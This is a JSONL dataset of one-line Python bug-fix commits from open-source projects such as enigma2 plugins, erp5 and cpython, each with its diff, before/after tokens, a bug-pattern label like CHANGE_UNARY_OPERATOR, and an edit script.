{"project": "beyonwiz-enigma2", "commit_sha": "6625716590a3001ae3dab6be0ad695a687a1b7f8", "parent_sha": "6bf69c371703f2aba3c9e3c0ac75967e9eb432d4", "file_path": "lib/python/Components/RFmod.py", "project_url": "https://github.com/sklnet/beyonwiz-enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class RFmod:\n \tdef setTestmode(self, value):\n \t\teRFmod.getInstance().setTestmode(value)\n \tdef setSoundFunction(self, value):\n-\t\teRFmod.getInstance().setSoundFunction(value)\n+\t\teRFmod.getInstance().setSoundFunction(not value)\n \tdef setSoundCarrier(self, value):\n \t\teRFmod.getInstance().setSoundCarrier(value)\n \tdef setChannel(self, value):\n", "before": "eRFmod . getInstance ( ) . setSoundFunction ( value )", "after": "eRFmod . getInstance ( ) . setSoundFunction ( not value )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 47], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:value\", 3, 41, 3, 46], 1]]"}
{"project": "beyonwiz-enigma2", "commit_sha": "1e501b95494b26b90898f1faa9a85ccb16789687", "parent_sha": "cb646eb275d4ff88fd05ebbc6675277586d07ec6", "file_path": "RecordTimer.py", "project_url": "https://github.com/sklnet/beyonwiz-enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -186,7 +186,7 @@ class RecordTimerEntry(timer.TimerEntry, object):\n \n \t\t\tprep_res=self.record_service.prepare(self.Filename + \".ts\", self.begin, self.end, event_id, self.name.replace(\"\\n\", \"\"), self.description.replace(\"\\n\", \"\"), ' '.join(self.tags))\n \t\t\tif prep_res:\n-\t\t\t\tif prep_res == 255:\n+\t\t\t\tif prep_res == -255:\n \t\t\t\t\tself.log(4, \"failed to write meta information\")\n \t\t\t\telse:\n \t\t\t\t\tself.log(2, \"'prepare' failed: error %d\" % prep_res)\n", "before": "if prep_res == 255 : self . log ( 4 , \"failed to write meta information\" ) else : self . log ( 2 , \"'prepare' failed: error %d\" % prep_res )", "after": "if prep_res == - 255 : self . log ( 4 , \"failed to write meta information\" ) else : self . log ( 2 , \"'prepare' failed: error %d\" % prep_res )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 23], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:255\", 3, 20, 3, 23], 1]]"}
{"project": "beyonwiz-enigma2", "commit_sha": "b223a61cc4bee3b1681f5d7da4603bfd1e157dc9", "parent_sha": "e3ad88cb610ddad4ac11fe72359cb494c2363daf", "file_path": "lib/python/Screens/LogManager.py", "project_url": "https://github.com/sklnet/beyonwiz-enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -129,7 +129,7 @@ class LogManager(Screen):\n \t\t\tself.defaultDir = '/media/hdd/'\n \t\telse:\n \t\t\tself.defaultDir = config.crash.debug_path.value\n-\t\tif not listdir(self.defaultDir):\n+\t\tif listdir(self.defaultDir):\n \t\t\tself.sel = self[\"list\"].getCurrent()[0]\n \t\t\tif self.sel:\n \t\t\t\tself.session.open(LogManagerViewLog, self.sel[0], self.logtype)\n", "before": "if not listdir ( self . defaultDir ) : self . sel = self [ \"list\" ] . getCurrent ( ) [ 0 ] if self . sel : self . session . open ( LogManagerViewLog , self . sel [ 0 ] , self . logtype )", "after": "if listdir ( self . defaultDir ) : self . sel = self [ \"list\" ] . getCurrent ( ) [ 0 ] if self . sel : self . session . open ( LogManagerViewLog , self . sel [ 0 ] , self . logtype )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 3, 6, 68], [\"call\", 3, 10, 3, 34], 1], [\"Delete\", [\"not:not\", 3, 6, 3, 9]], [\"Delete\", [\"not_operator\", 3, 6, 3, 34]]]"}
{"project": "beyonwiz-enigma2", "commit_sha": "ea33f6665e01b70f757513b49c77b16bfd06d0d4", "parent_sha": "884e199731c6de578b6a25aa9165191a94b909b2", "file_path": "lib/python/Screens/About.py", "project_url": "https://github.com/sklnet/beyonwiz-enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class Devices(Screen):\n \t\tf = open('/proc/mounts', 'r')\n \t\tfor line in f.readlines():\n \t\t\tself.parts = line.strip().split()\n-\t\t\tif not self.parts[0] and (self.parts[0].startswith('192') or self.parts[0].startswith('//192')):\n+\t\t\tif self.parts[0] and (self.parts[0].startswith('192') or self.parts[0].startswith('//192')):\n \t\t\t\tself.Console.ePopen(\"df -mh \" + self.parts[1] + \" | grep -v '^Filesystem'\", self.Stage1Complete)\n \t\t\telse:\n \t\t\t\tself[\"mounts\"].setText(_('none'))\n", "before": "if not self . parts [ 0 ] and ( self . parts [ 0 ] . startswith ( '192' ) or self . parts [ 0 ] . startswith ( '//192' ) ) : self . Console . ePopen ( \"df -mh \" + self . parts [ 1 ] + \" | grep -v '^Filesystem'\" , self . Stage1Complete ) else : self [ \"mounts\" ] . setText ( _ ( 'none' ) )", "after": "if self . parts [ 0 ] and ( self . parts [ 0 ] . startswith ( '192' ) or self . parts [ 0 ] . startswith ( '//192' ) ) : self . Console . ePopen ( \"df -mh \" + self . parts [ 1 ] + \" | grep -v '^Filesystem'\" , self . Stage1Complete ) else : self [ \"mounts\" ] . setText ( _ ( 'none' ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 4, 6, 38], [\"boolean_operator\", 3, 11, 3, 99], 1], [\"Delete\", [\"not:not\", 3, 7, 3, 10]], [\"Delete\", [\"not_operator\", 3, 7, 3, 99]]]"}
{"project": "enigma2-plugin-networkbrowser", "commit_sha": "f21e8352a1e6d6177b18c668d1db27142804c8ff", "parent_sha": "7e84f42f99f64f466e02325c46dc92abfa3cca1e", "file_path": "src/AutoMount.py", "project_url": "https://github.com/opendreambox/enigma2-plugin-networkbrowser", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ class AutoMount():\n \t\t\tself._ensureOption(options, 'retry', 'retry=0')\n \t\t\tself._ensureOption(options, 'retrans', 'retrans=1')\n \t\t\tself._ensureOption(options, 'timeo', 'timeo=2')\n-\t\t\tif not 'tcp' not in options and 'udp' not in options:\n+\t\t\tif 'tcp' not in options and 'udp' not in options:\n \t\t\t\toptions.append('udp')\n \n \t\treturn options\n", "before": "if not 'tcp' not in options and 'udp' not in options : options . append ( 'udp' )", "after": "if 'tcp' not in options and 'udp' not in options : options . append ( 'udp' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 4, 4, 26], [\"boolean_operator\", 3, 11, 3, 56], 1], [\"Delete\", [\"not:not\", 3, 7, 3, 10]], [\"Delete\", [\"not_operator\", 3, 7, 3, 56]]]"}
{"project": "coref-resolution", "commit_sha": "bfd75c9b31dccaeced6b6900b48c78d563116053", "parent_sha": "5856108871ab3242af817fcce85ca6715d16fa6b", "file_path": "featurize.py", "project_url": "https://github.com/clayriley/coref-resolution", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class Featurizer:\n         # record whether they corefer, if training\n         refs_i = set(antecedent[0][-1])\n         refs_j = set(anaphor[0][-1])\n-        coreference = int(refs_i.isdisjoint(refs_j)) if training else None\n+        coreference = int(not refs_i.isdisjoint(refs_j)) if training else None\n         \n         # generate values for use in features\n         sentence_dist = anaphor[0][0] - antecedent[-1][0]\n", "before": "coreference = int ( refs_i . isdisjoint ( refs_j ) ) if training else None", "after": "coreference = int ( not refs_i . isdisjoint ( refs_j ) ) if training else None", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 53], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 27, 3, 52], 1]]"}
{"project": "ibid", "commit_sha": "54dcf8accd3a4747dd051e87df68865252cae0f7", "parent_sha": "40571052e3b4726307db9fa185349773ee131af5", "file_path": "ibid/source/dc.py", "project_url": "https://github.com/ibid/ibid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ class SourceFactory(protocol.ReconnectingClientFactory, IbidSourceFactory):\n         self.log = logging.getLogger('source.%s' % self.name)\n         self._auth = {}\n         self.auth = ['op']\n-        if not self.implicit_auth:\n+        if self.implicit_auth:\n             self.auth.append('implicit')\n \n     def setServiceParent(self, service):\n", "before": "if not self . implicit_auth : self . auth . append ( 'implicit' )", "after": "if self . implicit_auth : self . auth . append ( 'implicit' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 4, 41], [\"attribute\", 3, 16, 3, 34], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 34]]]"}
{"project": "openwsn-sw", "commit_sha": "eb265aec84f008fe5d4de2164c939281e00e3d42", "parent_sha": "cca2478389f346b7ceb1b000dbe924d7d7aa3576", "file_path": "software/openvisualizer/bin/openVisualizerApp/openVisualizerApp.py", "project_url": "https://github.com/openwsn-berkeley/openwsn-sw", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -225,7 +225,7 @@ def main(parser=None):\n         {'logDir': _forceSlashSep(logdir, argspace.debug)}\n     )\n \n-    if not argspace.pathTopo:\n+    if argspace.pathTopo:\n         argspace.simulatorMode = True\n         argspace.numMotes = 0\n         argspace.simTopology = \"fully-meshed\"\n", "before": "if not argspace . pathTopo : argspace . simulatorMode = True argspace . numMotes = 0 argspace . simTopology = \"fully-meshed\"", "after": "if argspace . pathTopo : argspace . simulatorMode = True argspace . numMotes = 0 argspace . simTopology = \"fully-meshed\"", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 5, 6, 46], [\"attribute\", 3, 12, 3, 29], 1], [\"Delete\", [\"not:not\", 3, 8, 3, 11]], [\"Delete\", [\"not_operator\", 3, 8, 3, 29]]]"}
{"project": "openwsn-sw", "commit_sha": "518f749bf40fa170d716a382938cc3218b018ed6", "parent_sha": "b68cac19a47c816567de9413d62907a4eb213475", "file_path": "software/openvisualizer/openvisualizer/moteProbe/moteProbe.py", "project_url": "https://github.com/openwsn-berkeley/openwsn-sw", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -240,7 +240,7 @@ class moteProbe(threading.Thread):\n                                                 outputToWrite = self.outputBuf.pop(0)\n                                                 self.serial.write(outputToWrite)\n                                     else:\n-                                        with open('~/A8/serialData/'+socket.gethostname()++'.log','a') as f:\n+                                        with open('~/A8/serialData/'+socket.gethostname()+'.log','a') as f:\n                                             f.write(str([ord(c) for c in self.inputBuf])+'\\n')\n                                         # dispatch\n                                         dispatcher.send(\n", "before": "else : with open ( '~/A8/serialData/' + socket . gethostname ( ) + + '.log' , 'a' ) as f : f . write ( str ( [ ord ( c ) for c in self . inputBuf ] ) + '\\n' )", "after": "else : with open ( '~/A8/serialData/' + socket . gethostname ( ) + '.log' , 'a' ) as f : f . write ( str ( [ ord ( c ) for c in self . inputBuf ] ) + '\\n' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 51, 3, 98], [\"string:'.log'\", 3, 92, 3, 98], 2], [\"Delete\", [\"+:+\", 3, 91, 3, 92]], [\"Delete\", [\"unary_operator\", 3, 91, 3, 98]]]"}
{"project": "cookcountyjail", "commit_sha": "0535e16b0673362c931596093a6c99e981c5cd61", "parent_sha": "58420318e8a46d830cf1cdff21f3e5d94901f4a5", "file_path": "countyapi/management/commands/audit_db.py", "project_url": "https://github.com/sc3/cookcountyjail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class Command(BaseCommand):\n             housing_history_length = len(housing_history)\n             if housing_history_length == 0:\n                 self.increment_stat(NO_HOUSING_LOC)\n-                if not inmate.in_jail:\n+                if inmate.in_jail:\n                     self.increment_stat(IN_JAIL_INCORRECT)\n             else:\n                 if inmate.in_jail != housing_history[housing_history_length - 1].housing_location.in_jail:\n", "before": "if not inmate . in_jail : self . increment_stat ( IN_JAIL_INCORRECT )", "after": "if inmate . in_jail : self . increment_stat ( IN_JAIL_INCORRECT )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 17, 4, 59], [\"attribute\", 3, 24, 3, 38], 1], [\"Delete\", [\"not:not\", 3, 20, 3, 23]], [\"Delete\", [\"not_operator\", 3, 20, 3, 38]]]"}
{"project": "xbmc-addon-nrk", "commit_sha": "05baaafa1fddbfe9b951588309b4a24893d641fe", "parent_sha": "26dbf87c9d85251e5d1518c1c10d4d821c95f9da", "file_path": "data.py", "project_url": "https://github.com/tamland/xbmc-addon-nrk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ def get_episodes(series_id, season_id):\n   titles = [ parseDOM(tr, 'a', {'class':'p-link'})[0] for tr in trs ]\n   titles = map(html_decode, titles)\n   ids = [ parseDOM(tr, 'a', {'class':'p-link'}, ret='href')[0] for tr in trs ]\n-  ids = [ e.split('http://tv.nrk.no')[1] for e in ids ]\n+  ids = [ e.split('http://tv.nrk.no')[-1] for e in ids ]\n   descr = [lambda x=x: _get_descr(x) for x in ids ]\n   thumbs = repeat(_thumb_url(series_id))\n   fanart = repeat(_fanart_url(series_id))\n", "before": "ids = [ e . split ( 'http://tv.nrk.no' ) [ 1 ] for e in ids ]", "after": "ids = [ e . split ( 'http://tv.nrk.no' ) [ - 1 ] for e in ids ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"subscript\", 3, 11, 3, 41], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 39, 3, 40], 1]]"}
{"project": "erp5", "commit_sha": "1ccfc68919fb219bb291a4fc478c56c9f395a121", "parent_sha": "4effc28094a24cc12a34574eee8252e7046aa4ac", "file_path": "product/ERP5Type/Base.py", "project_url": "https://github.com/klebergraciasoares/erp5", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2777,7 +2777,7 @@ class Base( CopyContainer,\n     constraints = self.constraints\n     if filt is not None:\n       id_list = filt.get('id', None)\n-      if isinstance(id_list, (list, tuple)):\n+      if not isinstance(id_list, (list, tuple)):\n         id_list = [id_list]\n       constraints = filter(lambda x:x.id in id_list, constraints)\n     return constraints\n", "before": "if isinstance ( id_list , ( list , tuple ) ) : id_list = [ id_list ]", "after": "if not isinstance ( id_list , ( list , tuple ) ) : id_list = [ id_list ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 7, 4, 28], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 10, 3, 44], 1]]"}
{"project": "erp5", "commit_sha": "d5b62e058e537bf3fcfd117b61149e61ebe7085d", "parent_sha": "93cfb6d27930ba017a3db3102a4bc4c74ad67b38", "file_path": "product/ERP5/Document/SimulationMovement.py", "project_url": "https://github.com/smetsjp/erp5", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -517,7 +517,7 @@ class SimulationMovement(Movement):\n     cache_enabled = cache.get(TREE_DELIVERED_CACHE_ENABLED, 0)\n \n     def getTreeDelivered(movement, ignore_first=0):\n-      if ignore_first:\n+      if not ignore_first:\n         if len(movement.getDeliveryList()) > 0:\n           return True\n       for applied_rule in movement.objectValues():\n", "before": "if ignore_first : if len ( movement . getDeliveryList ( ) ) > 0 : return True", "after": "if not ignore_first : if len ( movement . getDeliveryList ( ) ) > 0 : return True", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 7, 5, 22], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:ignore_first\", 3, 10, 3, 22], 1]]"}
{"project": "bayespy", "commit_sha": "2456fad8a76ac9888c90505ec4c1ff9c587622b2", "parent_sha": "67248607376f5d295cb1ec07f90548be826976a1", "file_path": "bayespy/inference/vmp/nodes/tests/test_gaussian_markov_chain.py", "project_url": "https://github.com/willu47/bayespy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ class TestGaussianMarkovChain(unittest.TestCase):\n                                          np.einsum('...ij,...ij', \n                                                    mumu0,\n                                                    icov0),\n-                                         ldet,\n+                                         -ldet,\n                                          N*D)\n                                                    \n         # The VB bound from the net\n", "before": "ldet ,", "after": "- ldet ,", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 42, 3, 47], [\"unary_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:ldet\", 3, 42, 3, 46], 1]]"}
{"project": "DisableWinTracking", "commit_sha": "d0e30010dfb1ed777f04afdd3405cb3ebc9d72c3", "parent_sha": "5fbeb57d4cea4567a7b1b8ac459b900e29ecba34", "file_path": "dwt.py", "project_url": "https://github.com/10se1ucgo/DisableWinTracking", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class MainFrame(wx.Frame):\n         menu_bar.Append(help_menu, \"&Help\")\n         self.SetMenuBar(menu_bar)\n \n-        if bool(windll.advpack.IsNTAdmin(0, None)):\n+        if not bool(windll.advpack.IsNTAdmin(0, None)):\n             warn = wx.MessageDialog(parent=self,\n                                     message=\"Program requires elevation, please run it as an administrator.\",\n                                     caption=\"ERROR!\", style=wx.OK | wx.ICON_WARNING)\n", "before": "if bool ( windll . advpack . IsNTAdmin ( 0 , None ) ) : warn = wx . MessageDialog ( parent = self , message = \"Program requires elevation, please run it as an administrator.\" , caption = \"ERROR!\" , style = wx . OK | wx . ICON_WARNING )", "after": "if not bool ( windll . advpack . IsNTAdmin ( 0 , None ) ) : warn = wx . MessageDialog ( parent = self , message = \"Program requires elevation, please run it as an administrator.\" , caption = \"ERROR!\" , style = wx . OK | wx . ICON_WARNING )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 85], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 51], 1]]"}
{"project": "Limnoria", "commit_sha": "71cc414ff34a3908b53f27bbc84a5f33a5453131", "parent_sha": "d3a2964705e5203839255c9e992860e6e6874f68", "file_path": "src/commands.py", "project_url": "https://github.com/ProgVal/Limnoria", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -210,7 +210,7 @@ def urlSnarfer(f):\n         if not channel:\n             # Don't snarf in private\n             return\n-        if not (ircmsgs.isCtcp(msg) and not ircmsgs.isAction(msg)):\n+        if ircmsgs.isCtcp(msg) and not ircmsgs.isAction(msg):\n             # Don't snarf CTCPs unless they are a /me\n             return\n         if ircdb.channels.getChannel(channel).lobotomized:\n", "before": "if not ( ircmsgs . isCtcp ( msg ) and not ircmsgs . isAction ( msg ) ) : return", "after": "if ircmsgs . isCtcp ( msg ) and not ircmsgs . isAction ( msg ) : return", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 5, 19], [\"boolean_operator\", 3, 17, 3, 66], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"(:(\", 3, 16, 3, 17]], [\"Delete\", [\"):)\", 3, 66, 3, 67]], [\"Delete\", [\"parenthesized_expression\", 3, 16, 3, 67]], [\"Delete\", [\"not_operator\", 3, 12, 3, 67]]]"}
{"project": "VorDiff", "commit_sha": "5b871a375c8175ed866856a848af60f5d0382566", "parent_sha": "3916abde3d8609f58a6208b2e1b7619a01eed4d1", "file_path": "VorDiff/tests/test_operator.py", "project_url": "https://github.com/VoraciousFour/VorDiff", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,7 +262,7 @@ def test_square_root():\n \n     #scalar\n     f = op.square_root(x)\n-    assert f._val == x._val**(-0.5)\n+    assert f._val == x._val**(0.5)\n     assert f._der == x._der*(x._val**(-1/2)/2)\n \n     #constant\n", "before": "assert f . _val == x . _val ** ( - 0.5 )", "after": "assert f . _val == x . _val ** ( 0.5 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"parenthesized_expression\", 3, 30, 3, 36], [\"float:0.5\", 3, 32, 3, 35], 1], [\"Delete\", [\"-:-\", 3, 31, 3, 32]], [\"Delete\", [\"unary_operator\", 3, 31, 3, 35]]]"}
{"project": "pydarkstar", "commit_sha": "0fd2b44badfbc4a86538f24b07a3110453c3583d", "parent_sha": "a78cd206c15763c0edc6701c981f72e1ad7bacaa", "file_path": "pydarkstar/common.py", "project_url": "https://github.com/AdamGagorik/pydarkstar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ def backup(path, copy=False):\n         raise RuntimeError('can not backup file: %s' % old_path)\n \n     # copy the file\n-    if not copy:\n+    if copy:\n         logging.debug('backup (old): %s', old_path)\n         logging.debug('backup (new): %s', new_path)\n         shutil.copy(old_path, new_path)\n", "before": "if not copy : logging . debug ( 'backup (old): %s' , old_path ) logging . debug ( 'backup (new): %s' , new_path ) shutil . copy ( old_path , new_path )", "after": "if copy : logging . debug ( 'backup (old): %s' , old_path ) logging . debug ( 'backup (new): %s' , new_path ) shutil . copy ( old_path , new_path )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 5, 6, 40], [\"identifier:copy\", 3, 12, 3, 16], 1], [\"Delete\", [\"not:not\", 3, 8, 3, 11]], [\"Delete\", [\"not_operator\", 3, 8, 3, 16]]]"}
{"project": "la", "commit_sha": "8e323a8ffdce901fec062164d32d11fabc856e33", "parent_sha": "5ee11a0cb2d786488c14b57f5e8214c00edf650d", "file_path": "la/afunc.py", "project_url": "https://github.com/kwgoodman/la", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ def unique_group(groups):\n     \n # Normalize functions -------------------------------------------------------\n \n-def geometric_mean(x, axis=1, check_for_greater_than_zero=True):\n+def geometric_mean(x, axis=-1, check_for_greater_than_zero=True):\n", "before": "def geometric_mean ( x , axis = 1 , check_for_greater_than_zero = True ) : ", "after": "def geometric_mean ( x , axis = - 1 , check_for_greater_than_zero = True ) : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 23, 3, 29], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 28, 3, 29], 1]]"}
{"project": "askbot-devel", "commit_sha": "2d5841fd651fb73bbbda5362d76fe39fb38c7bd8", "parent_sha": "b0dba977991ee073a49b4f86c0c06bb9f729f812", "file_path": "askbot/auth.py", "project_url": "https://github.com/vfoss-org/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ def onUnFlaggedItem(post, user, timestamp=None):\n     flagged_user = post.author\n \n     flagged_user.receive_reputation(\n-        askbot_settings.REP_LOSS_FOR_RECEIVING_FLAG\n+        -askbot_settings.REP_LOSS_FOR_RECEIVING_FLAG #negative of a negative\n     )\n     flagged_user.save()\n \n", "before": "flagged_user . receive_reputation ( askbot_settings . REP_LOSS_FOR_RECEIVING_FLAG )", "after": "flagged_user . receive_reputation ( - askbot_settings . REP_LOSS_FOR_RECEIVING_FLAG )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 36, 4, 6], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 9, 3, 52], 1]]"}
{"project": "cpython", "commit_sha": "5a28bfbbc7707b6820b3ecf31589d04ee9120da5", "parent_sha": "30bff63958c4aaa867aef686c4d1520c99d4f13d", "file_path": "Lib/profile.py", "project_url": "https://github.com/MatthieuDartiailh/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class Profile:\n \n     def trace_dispatch_exception(self, frame, t):\n         rt, rtt, rct, rfn, rframe, rcur = self.cur\n-        if (not rframe is frame) and rcur:\n+        if (rframe is frame) and rcur:\n             return self.trace_dispatch_return(rframe, t)\n         return 0\n \n", "before": "if ( not rframe is frame ) and rcur : return self . trace_dispatch_return ( rframe , t )", "after": "if ( rframe is frame ) and rcur : return self . trace_dispatch_return ( rframe , t )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"parenthesized_expression\", 3, 12, 3, 33], [\"comparison_operator\", 3, 17, 3, 32], 1], [\"Delete\", [\"not:not\", 3, 13, 3, 16]], [\"Delete\", [\"not_operator\", 3, 13, 3, 32]]]"}
{"project": "CANToolz", "commit_sha": "7f108d7b59cbfe9bd86c7b76c277b5675e458a39", "parent_sha": "a17191ff230d700031792fcd48b1f9db32ccde14", "file_path": "modules/gen_ping.py", "project_url": "https://github.com/rinetd/CANToolz", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class gen_ping(CANModule):\n     iso = []\n \n     def getLast(self):\n-        if self.iso:\n+        if not self.iso:\n             self._active = False\n             return None\n \n", "before": "if self . iso : self . _active = False return None", "after": "if not self . iso : self . _active = False return None", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 24], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 20], 1]]"}
{"project": "seq2seq-1", "commit_sha": "f536a6c739ec0c16bf68c2abef1ade30cf0f8786", "parent_sha": "c81b42a12d7a5769272f866e15f67bdb359bbff4", "file_path": "seq2seq/decoders/rnn_decoder.py", "project_url": "https://github.com/libertatis/seq2seq-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class RNNDecoder(Decoder, GraphModule, Configurable):\n \n     scope = tf.get_variable_scope()\n     scope.set_initializer(tf.random_uniform_initializer(\n-        self.params[\"init_scale\"],\n+        -self.params[\"init_scale\"],\n         self.params[\"init_scale\"]))\n \n     maximum_iterations = None\n", "before": "scope . set_initializer ( tf . random_uniform_initializer ( self . params [ \"init_scale\" ] , self . params [ \"init_scale\" ] ) )", "after": "scope . set_initializer ( tf . random_uniform_initializer ( - self . params [ \"init_scale\" ] , self . params [ \"init_scale\" ] ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"subscript\", 3, 9, 3, 34], [\"argument_list\", 2, 56, 4, 35], 2], [\"Insert\", [\"argument_list\", 2, 56, 4, 35], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:\\\"init_scale\\\"\", \"T\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:params\", \"T\"], 2], [\"Delete\", [\"identifier:self\", 4, 9, 4, 13]], [\"Delete\", [\".:.\", 4, 13, 4, 14]], [\"Delete\", [\"identifier:params\", 4, 14, 4, 20]], [\"Delete\", [\"attribute\", 4, 9, 4, 20]], [\"Delete\", [\"[:[\", 4, 20, 4, 21]], [\"Delete\", [\"string:\\\"init_scale\\\"\", 4, 21, 4, 33]], [\"Delete\", [\"]:]\", 4, 33, 4, 34]], [\"Delete\", [\"subscript\", 4, 9, 4, 34]]]"}
{"project": "zeit.cms", "commit_sha": "dcf9f7a9188883a5339a1e123992f748ca887405", "parent_sha": "3ad863a4b0d6a621ef762fedd12ab310c08cd5f2", "file_path": "src/zeit/cms/workflow/status.py", "project_url": "https://github.com/ZeitOnline/zeit.cms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def reset_publishinfo_on_copy(context, event):\n         prop = getattr(type(info), name)\n         if not isinstance(prop, zeit.cms.content.dav.DAVProperty):\n             continue\n-        if not live.is_writeable_live(prop.namespace, prop.name):\n+        if not live.is_writeable_live(prop.name, prop.namespace):\n             continue\n         current = getattr(info, name)\n         if current != field.default:\n", "before": "if not live . is_writeable_live ( prop . namespace , prop . name ) : continue", "after": "if not live . is_writeable_live ( prop . name , prop . namespace ) : continue", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"attribute\", 3, 39, 3, 53], [\"argument_list\", 3, 38, 3, 65], 2], [\"Move\", [\"attribute\", 3, 55, 3, 64], [\"argument_list\", 3, 38, 3, 65], 1]]"}
